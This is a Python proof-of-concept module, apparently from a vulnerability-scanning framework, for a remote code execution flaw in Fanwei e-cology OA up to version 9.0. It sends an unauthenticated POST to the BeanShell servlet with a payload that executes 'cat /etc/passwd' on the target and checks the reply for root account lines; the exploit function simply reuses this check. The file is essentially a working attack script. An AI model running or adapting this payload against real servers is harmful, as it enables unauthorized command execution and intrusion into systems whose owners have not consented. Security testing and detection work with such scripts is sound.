import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Fanwei e-cology <= 9.0 Remote Code Execution''',
        "description": '''The attacker can directly execute arbitrary commands on the target server by invoking the unauthorized access problem interface in the BeanShell component. Currently, the security patch for this vulnerability has been released. Please take protective measures as soon as possible for users who use the Fanwei e-cology OA system.''',
        "severity": "critical",
        "references": [
            "https://blog.actorsfit.com/a?ID=01500-11a2f7e6-54b0-4a40-9a79-5c56dc6ebd51"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["fanwei", "cnvd", "cnvd2019", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/bsh.servlet.BshServlet"""
        method = "POST"
        data = """bsh.script=exec("cat+/etc/passwd");&bsh.servlet.output=raw"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0:""",resp0.text)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url